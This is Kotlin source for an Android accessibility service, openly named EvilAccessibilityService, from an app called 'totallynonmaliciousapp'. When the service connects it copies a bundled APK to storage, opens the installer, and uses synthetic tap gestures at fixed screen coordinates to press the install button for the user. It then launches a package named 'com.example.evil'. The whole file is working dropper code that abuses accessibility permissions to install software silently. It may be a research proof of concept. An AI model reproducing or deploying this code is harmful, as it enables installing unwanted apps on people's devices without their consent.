package jamil.totallynonmaliciousapp.services

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.accessibilityservice.GestureDescription
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.graphics.Path
import android.support.v4.content.FileProvider.getUriForFile
import android.view.accessibility.AccessibilityEvent
import android.widget.Toast
import jamil.totallynonmaliciousapp.BuildConfig
import jamil.totallynonmaliciousapp.R
import java.io.File


class EvilAccessibilityService : AccessibilityService() {

    override fun onCreate() {
        super.onCreate()
        Toast.makeText(this, "EvilAccessibilityService started!", Toast.LENGTH_SHORT).show()




    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        // TODO("not implemented") //To change body of created functions use File | Settings | File Templates.
    }

    override fun onInterrupt() {
        // nothing
    }

    override fun onServiceConnected() {
        Toast.makeText(this, "Service connected", Toast.LENGTH_SHORT).show()
        val info = AccessibilityServiceInfo()
        info.eventTypes = AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED
        info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_ALL_MASK
        info.notificationTimeout = 100
        info.packageNames = null
        serviceInfo = info

        installGodApp()
    }

    fun installGodApp() {
        /*
        val intent = Intent(Intent.ACTION_INSTALL_PACKAGE)
        intent.setData(Uri.parse("android.resource://jamil.totallynonmaliciousapp/raw/app.apk"));
        intent.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
        startActivity(intent)
        */

        val apkResourse = resources.openRawResource(R.raw.app)
        openFileOutput("app.apk", Context.MODE_PRIVATE).use {
            apkResourse.copyTo(it)
        }


        val toInstall = File(filesDir, "app.apk")
        val apkUri = getUriForFile(this, BuildConfig.APPLICATION_ID + ".provider", toInstall)
        val intent = Intent(Intent.ACTION_VIEW)
        intent.data = apkUri
        intent.flags = Intent.FLAG_GRANT_READ_URI_PERMISSION
        startActivity(intent)

        pressInstall()

    }

    fun pressInstall(){
        val builder = GestureDescription.Builder()
        val path = Path()
        path.moveTo(980.0f, 1710.0f)
        val stroke1 = GestureDescription.StrokeDescription(path, 1000, 100)
        builder.addStroke(stroke1)
        val stroke2 = GestureDescription.StrokeDescription(path, 5000, 100)
        builder.addStroke(stroke2)
        dispatchGesture(builder.build(), DoneInstallingCallback(), null)
    }
    inner class DoneInstallingCallback : AccessibilityService.GestureResultCallback() {
        override fun onCompleted(gestureDescription: GestureDescription?) {
            super.onCompleted(gestureDescription)

            val intent = Intent(Intent.ACTION_MAIN)
            intent.component = ComponentName("com.example.evil", "com.example.evil.MainActivity")
            startActivity(intent)
            return

            val builder = GestureDescription.Builder()
            val path0 = Path()
            path0.moveTo(860.0f, 1850.0f)
            val stroke0 = GestureDescription.StrokeDescription(path0, 3000, 100)
            builder.addStroke(stroke0)
            val path1 = Path()
            path1.moveTo(500.0f, 500.0f)
            path1.lineTo(500.0f, 1500.0f)
            val stroke1 = GestureDescription.StrokeDescription(path1, 5000, 500)
            builder.addStroke(stroke1)
            val path2 = Path()
            path2.moveTo(940.0f, 145.0f)
            val stroke2 = GestureDescription.StrokeDescription(path2, 7000, 100)
            builder.addStroke(stroke2)
            dispatchGesture(builder.build(), null, null)


            /*
            val builder = GestureDescription.Builder()
            val path0 = Path()
            path0.moveTo(860.0f, 1850.0f)
            val stroke0 = GestureDescription.StrokeDescription(path0, 3000, 100)
            builder.addStroke(stroke0)
            val path1 = Path()
            path1.moveTo(500.0f, 500.0f)
            path1.lineTo(500.0f, 1500.0f)
            val stroke1 = GestureDescription.StrokeDescription(path1, 5000, 500)
            builder.addStroke(stroke1)
            val path2 = Path()
            path2.moveTo(940.0f, 145.0f)
            val stroke2 = GestureDescription.StrokeDescription(path2, 7000, 100)
            builder.addStroke(stroke2)
            dispatchGesture(builder.build(), null, null)
            */
        }
    }



}